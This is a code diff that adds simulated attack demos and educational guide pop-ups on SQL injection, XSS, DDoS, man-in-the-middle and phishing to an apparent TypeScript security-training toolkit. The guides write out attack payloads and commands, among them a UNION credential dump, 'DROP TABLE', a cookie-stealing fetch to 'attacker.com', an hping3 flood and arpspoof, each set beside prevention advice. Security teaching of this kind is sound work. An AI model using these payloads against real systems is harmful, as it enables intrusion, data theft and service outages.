@@ -268,6 +268,390 @@ Entropy: ${(Math.random() * 100).toFixed(2)}%`;
         this.showModal(content);
     }
 
+    public async sqlInjectionDemo(): Promise<void> {
+        this.showOutput('💉 Simulating SQL Injection attack...\n');
+        
+        const payloads = [
+            "' OR '1'='1",
+            "admin'--",
+            "' UNION SELECT * FROM users--",
+            "'; DROP TABLE users;--"
+        ];
+        
+        for (let i = 0; i < payloads.length; i++) {
+            await this.delay(800);
+            const payload = payloads[i];
+            const output = `Payload ${i + 1}: ${payload}\nResult: ${i === 0 ? '✓ Authentication bypassed!' : 'Testing...'}`;
+            this.showOutput(`💉 SQL Injection Attack:\n\n${output}`);
+        }
+    }
+
+    public showSQLInjectionGuide(): void {
+        const content = `
+            <h2>💉 SQL Injection Attack - Educational Guide</h2>
+            
+            <h3>What is SQL Injection?</h3>
+            <p>SQL Injection exploits vulnerabilities in database queries to manipulate or extract data.</p>
+            
+            <div class="step">
+                <h4>Step 1: Identify Input Fields</h4>
+                <p>Find forms, URLs, or APIs that accept user input</p>
+                <code>Login forms, search boxes, URL parameters</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 2: Test for Vulnerability</h4>
+                <p>Try basic SQL injection payloads</p>
+                <code>' OR '1'='1</code>
+                <code>admin'--</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 3: Extract Data</h4>
+                <p>Use UNION queries to retrieve data</p>
+                <code>' UNION SELECT username, password FROM users--</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 4: Escalate Attack</h4>
+                <p>Attempt to modify or delete data</p>
+                <code>'; DROP TABLE users;--</code>
+            </div>
+            
+            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
+            
+            <div class="prevention">
+                <h4>1. Parameterized Queries</h4>
+                <code>SELECT * FROM users WHERE id = ?</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>2. Input Validation</h4>
+                <code>Whitelist allowed characters, escape special chars</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>3. Use ORM/Query Builders</h4>
+                <code>Sequelize, TypeORM, Prisma</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>4. Least Privilege</h4>
+                <code>Database user with minimal permissions</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>5. WAF (Web Application Firewall)</h4>
+                <code>CloudFlare, AWS WAF, ModSecurity</code>
+            </div>
+        `;
+        
+        this.showModal(content);
+    }
+
+    public async xssAttackDemo(): Promise<void> {
+        this.showOutput('⚡ Simulating XSS attack...\n');
+        
+        const payloads = [
+            '<script>alert("XSS")</script>',
+            '<img src=x onerror=alert("XSS")>',
+            '<svg onload=alert("XSS")>',
+            'javascript:alert("XSS")'
+        ];
+        
+        for (let i = 0; i < payloads.length; i++) {
+            await this.delay(800);
+            const output = `Payload ${i + 1}: ${payloads[i]}\nStatus: ${i === 0 ? '✓ Script executed!' : 'Testing...'}`;
+            this.showOutput(`⚡ XSS Attack:\n\n${output}`);
+        }
+    }
+
+    public showXSSGuide(): void {
+        const content = `
+            <h2>⚡ Cross-Site Scripting (XSS) - Educational Guide</h2>
+            
+            <h3>What is XSS?</h3>
+            <p>XSS injects malicious scripts into web pages viewed by other users.</p>
+            
+            <div class="step">
+                <h4>Step 1: Find Injection Points</h4>
+                <p>Identify where user input is displayed</p>
+                <code>Comments, search results, profile fields</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 2: Test Basic Payloads</h4>
+                <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 3: Bypass Filters</h4>
+                <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
+                <code>&lt;svg onload=alert('XSS')&gt;</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 4: Steal Cookies/Sessions</h4>
+                <code>&lt;script&gt;fetch('attacker.com?c='+document.cookie)&lt;/script&gt;</code>
+            </div>
+            
+            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
+            
+            <div class="prevention">
+                <h4>1. Output Encoding</h4>
+                <code>Escape HTML, JavaScript, URL contexts</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>2. Content Security Policy (CSP)</h4>
+                <code>Content-Security-Policy: default-src 'self'</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>3. HTTPOnly Cookies</h4>
+                <code>Set-Cookie: session=abc; HttpOnly; Secure</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>4. Input Validation</h4>
+                <code>Sanitize user input, use DOMPurify</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>5. Framework Protection</h4>
+                <code>React, Vue, Angular auto-escape by default</code>
+            </div>
+        `;
+        
+        this.showModal(content);
+    }
+
+    public async ddosAttackDemo(): Promise<void> {
+        this.showOutput('💥 Simulating DDoS attack...\n');
+        
+        for (let i = 1; i <= 5; i++) {
+            await this.delay(500);
+            const requests = i * 1000;
+            const output = `Wave ${i}: ${requests} requests/sec\nServer load: ${i * 20}%\nStatus: ${i >= 4 ? '⚠️ Server overloaded!' : 'Attacking...'}`;
+            this.showOutput(`💥 DDoS Attack:\n\n${output}`);
+        }
+    }
+
+    public showDDoSGuide(): void {
+        const content = `
+            <h2>💥 DDoS Attack - Educational Guide</h2>
+            
+            <h3>What is DDoS?</h3>
+            <p>Distributed Denial of Service overwhelms servers with traffic to make them unavailable.</p>
+            
+            <div class="step">
+                <h4>Step 1: Build Botnet</h4>
+                <p>Compromise multiple machines (illegal without permission)</p>
+                <code>IoT devices, infected computers</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 2: Choose Attack Type</h4>
+                <code>SYN Flood, UDP Flood, HTTP Flood</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 3: Launch Attack</h4>
+                <p>Send massive traffic from multiple sources</p>
+                <code>hping3 -S --flood -V target.com</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 4: Amplification</h4>
+                <p>Use DNS/NTP amplification for larger impact</p>
+            </div>
+            
+            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
+            
+            <div class="prevention">
+                <h4>1. CDN & DDoS Protection</h4>
+                <code>CloudFlare, AWS Shield, Akamai</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>2. Rate Limiting</h4>
+                <code>Limit requests per IP/user</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>3. Load Balancing</h4>
+                <code>Distribute traffic across servers</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>4. Traffic Filtering</h4>
+                <code>Block malicious IPs, geo-blocking</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>5. Auto-Scaling</h4>
+                <code>AWS Auto Scaling, Kubernetes HPA</code>
+            </div>
+        `;
+        
+        this.showModal(content);
+    }
+
+    public async mitmAttackDemo(): Promise<void> {
+        this.showOutput('🕵️ Simulating MITM attack...\n');
+        
+        const steps = [
+            'ARP spoofing initiated',
+            'Intercepting traffic between client and server',
+            'Captured credentials: admin:password123',
+            'Session hijacked successfully'
+        ];
+        
+        for (let i = 0; i < steps.length; i++) {
+            await this.delay(1000);
+            const output = steps.slice(0, i + 1).join('\n');
+            this.showOutput(`🕵️ MITM Attack:\n\n${output}`);
+        }
+    }
+
+    public showMITMGuide(): void {
+        const content = `
+            <h2>🕵️ Man-in-the-Middle Attack - Educational Guide</h2>
+            
+            <h3>What is MITM?</h3>
+            <p>Attacker intercepts communication between two parties to steal or modify data.</p>
+            
+            <div class="step">
+                <h4>Step 1: Position Yourself</h4>
+                <p>Get on the same network as target</p>
+                <code>Public WiFi, compromised router</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 2: ARP Spoofing</h4>
+                <code>arpspoof -i eth0 -t target gateway</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 3: Intercept Traffic</h4>
+                <code>wireshark, tcpdump, ettercap</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 4: Capture Credentials</h4>
+                <p>Extract passwords, cookies, tokens</p>
+            </div>
+            
+            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
+            
+            <div class="prevention">
+                <h4>1. Use HTTPS Everywhere</h4>
+                <code>Force SSL/TLS encryption</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>2. VPN</h4>
+                <code>Encrypt all network traffic</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>3. Certificate Pinning</h4>
+                <code>Validate SSL certificates</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>4. Avoid Public WiFi</h4>
+                <code>Use mobile hotspot or trusted networks</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>5. HSTS Headers</h4>
+                <code>Strict-Transport-Security: max-age=31536000</code>
+            </div>
+        `;
+        
+        this.showModal(content);
+    }
+
+    public async phishingDemo(): Promise<void> {
+        this.showOutput('🎣 Simulating phishing campaign...\n');
+        
+        const steps = [
+            'Email sent: "Urgent: Verify your account"',
+            'Target clicked malicious link',
+            'Fake login page displayed',
+            'Credentials captured: user@email.com:pass123'
+        ];
+        
+        for (let i = 0; i < steps.length; i++) {
+            await this.delay(1000);
+            const output = steps.slice(0, i + 1).join('\n');
+            this.showOutput(`🎣 Phishing Attack:\n\n${output}`);
+        }
+    }
+
+    public showPhishingGuide(): void {
+        const content = `
+            <h2>🎣 Phishing Attack - Educational Guide</h2>
+            
+            <h3>What is Phishing?</h3>
+            <p>Social engineering attack that tricks users into revealing sensitive information.</p>
+            
+            <div class="step">
+                <h4>Step 1: Reconnaissance</h4>
+                <p>Gather information about targets</p>
+                <code>LinkedIn, social media, company websites</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 2: Create Fake Page</h4>
+                <p>Clone legitimate login page</p>
+                <code>httrack, wget --mirror</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 3: Craft Email</h4>
+                <p>Create convincing phishing email</p>
+                <code>Urgent subject, official branding, call to action</code>
+            </div>
+            
+            <div class="step">
+                <h4>Step 4: Send Campaign</h4>
+                <p>Distribute emails to targets</p>
+                <code>GoPhish, SET (Social Engineering Toolkit)</code>
+            </div>
+            
+            <h3 style="color: #2ecc71; margin-top: 2rem;">🛡️ Prevention Methods</h3>
+            
+            <div class="prevention">
+                <h4>1. Security Awareness Training</h4>
+                <code>Educate users to recognize phishing</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>2. Email Filtering</h4>
+                <code>SPF, DKIM, DMARC records</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>3. Multi-Factor Authentication</h4>
+                <code>Even if password stolen, MFA blocks access</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>4. Link Verification</h4>
+                <code>Hover over links, check URLs carefully</code>
+            </div>
+            
+            <div class="prevention">
+                <h4>5. Report Suspicious Emails</h4>
+                <code>Use email client's report phishing feature</code>
+            </div>
+        `;
+        
+        this.showModal(content);
+    }
+
     private showModal(content: string): void {
         this.modalBody.innerHTML = content;
         this.modal.classList.add('show');
@@ -296,6 +680,26 @@ const toolkit = new CyberSecToolkit();
 (window as any).bruteForce = () => {
     toolkit.showBruteForceGuide();
     setTimeout(() => toolkit.bruteForceDemo(), 1000);
+};
+(window as any).sqlInjection = () => {
+    toolkit.showSQLInjectionGuide();
+    setTimeout(() => toolkit.sqlInjectionDemo(), 1000);
+};
+(window as any).xssAttack = () => {
+    toolkit.showXSSGuide();
+    setTimeout(() => toolkit.xssAttackDemo(), 1000);
+};
+(window as any).ddosAttack = () => {
+    toolkit.showDDoSGuide();
+    setTimeout(() => toolkit.ddosAttackDemo(), 1000);
+};
+(window as any).mitm = () => {
+    toolkit.showMITMGuide();
+    setTimeout(() => toolkit.mitmAttackDemo(), 1000);
+};
+(window as any).phishing = () => {
+    toolkit.showPhishingGuide();
+    setTimeout(() => toolkit.phishingDemo(), 1000);
 };
 (window as any).showPrevention = () => toolkit.showPreventionGuide();
 (window as any).closeModal = () => toolkit.closeModal();
